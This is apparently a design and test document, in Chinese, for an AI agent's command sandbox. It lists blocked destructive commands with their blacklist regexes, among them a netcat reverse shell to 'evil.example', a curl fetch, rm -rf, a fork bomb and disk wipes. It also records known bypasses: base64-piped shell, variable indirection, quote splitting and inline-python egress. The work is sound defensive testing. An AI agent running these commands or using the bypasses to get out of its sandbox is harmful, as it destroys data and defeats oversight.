# 沙箱逃逸矩阵（Sandbox Escape Matrix）

> 适用版本：v0.4 / v1.0-M0（含可插拔 Docker 后端）
> 被测对象：`SandboxExecutor`（local）+ `DockerSandboxExecutor`（`defenses/docker_sandbox.py`）
> 回归套件：`tests/test_sandbox_escape.py`（用例名与下表对齐）+ `tests/test_docker_sandbox.py`

## 一句话结论

**默认的 local 沙箱仍是"危险命令黑名单 + 资源限制 + 超时"，不是隔离边界。**
它能挡住脚本小子的常见破坏命令，但**挡不住任何有意的绕过**。生产请开
容器后端：`AGENT_SHIELD_SANDBOX=docker`（或 `auto`：有 Docker 则容器，否则回退 local）。
`RunCommandTool` / `build_sandbox_executor()` 共用同一接口。

> 关键设计：命中黑名单 → **拒绝执行**（`denied=True`，不产生副作用）；
> 未命中 → 交给自己做判定的人（`deny_match()` 是纯判定 API，可安全用于"只判定不执行"的场景）。

---

## 1. 已被拦截（BLOCKED）

命中即拒绝执行，安全性由"命令从未运行"保证。

| 用例名 | 示例命令 | 命中模式 |
| --- | --- | --- |
| `rm-rf-flag` | `rm -rf /tmp/x` | `rm\s+-[rf]+` |
| `rm-split-flags` | `rm -r -f /tmp/x` | `rm\s+-r\s+-f` |
| `mkfs` | `mkfs.ext4 /dev/sda` | `mkfs` |
| `fdisk` | `fdisk /dev/sda` | `fdisk` |
| `dd-write-disk` | `dd if=/dev/zero of=/dev/sda` | `dd\s+if=` |
| `format-drive` | `format c:` | `format\s+[a-z]:` |
| `fork-bomb` | `:(){ :\|:& };:` | `:\(\)\s*\{` |
| `curl-egress` | `curl http://evil.example/x.sh` | `curl` |
| `wget-egress` | `wget http://evil.example/x` | `wget` |
| `netcat` | `nc -e /bin/sh evil.example 4444` | `nc` |
| `ncat` | `ncat -l 4444` | `ncat` |
| `shutdown` | `shutdown -h now` | `shutdown` |
| `reboot` | `reboot` | `reboot` |
| `sudo` | `sudo rm -rf /tmp/x` | `sudo` |
| `su-root` | `su - root` | `su\s+-` |
| `no-preserve-root` | `rm -rf / --no-preserve-root` | `--no-preserve-root` |
| `write-block-device` | `echo x > /dev/sda` | `>\s*/dev/(sd\|hd\|disk)` |
| `chmod-root` | `chmod -R 777 /` | `chmod\s+-R\s+777\s+/` |
| `kill-pid` | `kill -9 1234` | `kill\s+-9\s+\d+` |

---

## 2. 明确挡不住（BYPASS，v0 已知缺口）

这些用例**只断言"黑名单不命中"**（因此也不会被真正执行），用于固定"我们还差什么"。

| 用例名 | 示例命令 | 为什么挡不住 | 策略层的补救 |
| --- | --- | --- | --- |
| `inline-interpreter` | `python -c "import os; os.system('id')"` | 文本匹配无法理解"解释器内嵌代码"的语义 | ✅ 语义策略拒绝非白名单命令（`python` 不在 `allow_commands`） |
| `base64-pipe` | `echo cm0gLXJmIC8= \| base64 -d \| sh` | 编码混淆不匹配任何正则 | ✅ 策略拦截管道等 shell 元字符 |
| `variable-indirection` | `CMD=rm; $CMD -rf /tmp/x` | 变量拼接把危险命令拆成无害片段 | ✅ 策略拦截 `;` 与 `$` |
| `quote-splitting` | `r""m -rf /tmp/x` | 引号拆分绕过正则文本匹配 | ✅ 策略 `shlex` 解析后按 `rm` 判定 |
| `shred-file` | `shred -u /tmp/x` | 同类破坏性工具未列入黑名单 | ✅ 非白名单命令被拒绝 |
| `socket-egress` | `python -c "import socket; socket.create_connection(('example.com', 80))"` | **无网络命名空间隔离**，只拦 curl/wget 等 CLI | ✅ 命令白名单拦截 |
| `env-dump` | `env` | 环境变量（可能含密钥）可被读取回显 | ✅ 非白名单命令被拒绝 |
| `write-outside-cwd` | `python -c "open('{工作目录之外}/x', 'w')"` | **无文件系统隔离**，进程可写工作目录之外 | ✅ 命令白名单拦截（但 `write_file` 工具另有 realpath 根目录校验） |

> 说明：策略层的补救只在**同时启用 `PolicyEngine`**（即 `agent-defense` / `--defense`）时生效。
> 单独使用 `SandboxExecutor` 时，上表所有 BYPASS 用例都会真实执行。

---

## 3. 平台差异（必须知道）

| 平台 | 危险命令黑名单 | 资源限制（CPU/内存/文件大小） | 超时 | 网络隔离 | 文件系统隔离 |
| --- | --- | --- | --- | --- | --- |
| Linux / macOS | ✅ | ✅ `resource`（RLIMIT_CPU/FSIZE/AS） | ✅ | ❌ | ❌ |
| Windows | ✅ | ❌ 无 `resource` 模块（退化为"黑名单 + 超时"） | ✅ | ❌ | ❌ |

Windows 上的差异由 `tests/test_sandbox_escape.py::test_windows_sandbox_has_no_rlimit` /
`test_posix_sandbox_has_rlimit` 固定，避免跨平台误判防护强度。

---

## 4. Docker 后端现状（A1 部分落地）

环境变量：`AGENT_SHIELD_SANDBOX=auto|local|docker`，镜像 `AGENT_SHIELD_SANDBOX_IMAGE`（默认 `alpine:3.20`）。

容器参数：`--network=none`、`--read-only`、`tmpfs /tmp`、`--user 65534`、`--memory` / `--cpus` / `--pids-limit`、`no-new-privileges`。

| BYPASS 用例 | local 黑名单 | Docker 后端（隔离层） |
| --- | --- | --- |
| `inline-interpreter` | ❌ 仍可进容器执行 python（若镜像有） | ⚠️ 隔离在容器内，**不**升为黑名单 BLOCKED；策略层仍拒 |
| `base64-pipe` / `variable-indirection` / `quote-splitting` | ❌ | ⚠️ 同上；策略拦元字符 |
| `shred-file` / `env-dump` | ❌ | ⚠️ 容器内执行；策略白名单拒 |
| `socket-egress` | ❌ 无网络 NS | ✅ `--network=none`（见 `test_docker_sandbox_network_none_blocks_egress`） |
| `write-outside-cwd` | ❌ 无 FS 隔离 | ✅ 只读根 + 仅挂载工作目录（见 readonly 测试） |

说明：第 2 节 BYPASS **仍对 local 黑名单成立**（逃逸套件不改断言口径）；Docker 用**隔离**兜住网络/写盘，
不等于把黑名单扩成「解释器一律拒绝」。完整 A1 验收（8 条全部升 BLOCKED）仍待 gVisor/策略默认收紧。

## 5. v1.0 强隔离计划（对应 `docs/optimization-plan-v1.0.md` A1–A4）

| 目标 | 手段 | 验收标准 |
| --- | --- | --- |
| A1 容器化强沙箱 | Docker/Podman：只读根、临时卷、非 root、资源限制（**已提供可插拔实现**） | 网络/写盘隔离可测；第 2 节 8 条全部升 BLOCKED 仍为后续 |
| A2 内核级隔离 | gVisor / nsjail / Firecracker 可选后端（同一接口） | 同上，启动 < 2s |
| A3 跨平台 | Windows Job Objects / AppContainer；macOS `sandbox-exec` | 三平台各自跑通逃逸套件 |
| A4 网络与出网策略 | 默认无网络 + 出网白名单 + DNS 日志 | `socket-egress`：Docker 已隔离；黑名单口径另议 |
| A5 资源与成本预算 | 单次运行工具调用数 / token / 墙钟 / 美元预算 | 超限自动终止并标记 `budget_exhausted` |

**验收方式**：local 黑名单用例仍由 `tests/test_sandbox_escape.py` + 本文第 1–2 节同步
（`test_escape_matrix_doc_lists_all_cases`）；Docker 隔离由 `tests/test_docker_sandbox.py`（无 daemon 则 skip）。

---

## 6. 怎么用这套矩阵

```bash
pytest -q tests/test_sandbox_escape.py       # local 黑名单边界（离线）
pytest -q tests/test_docker_sandbox.py       # 有 Docker 时跑容器隔离；否则 skip
set AGENT_SHIELD_SANDBOX=docker              # Windows PowerShell: $env:AGENT_SHIELD_SANDBOX="docker"
agent-shield benchmark                        # 攻防矩阵（含沙箱相关的 ASI-05/08）
```

写报告时的正确表述示例：

> local `SandboxExecutor` 拦截 19 类破坏性命令，另有 8 类已知绕过；其中多数在
> `PolicyEngine` 下由语义校验兜住。启用 `DockerSandboxExecutor`（`AGENT_SHIELD_SANDBOX=docker|auto`）
> 后，网络与根文件系统写入在容器边界被隔离；解释器类绕过仍需策略白名单，不宜宣称「黑名单已无逃逸」。
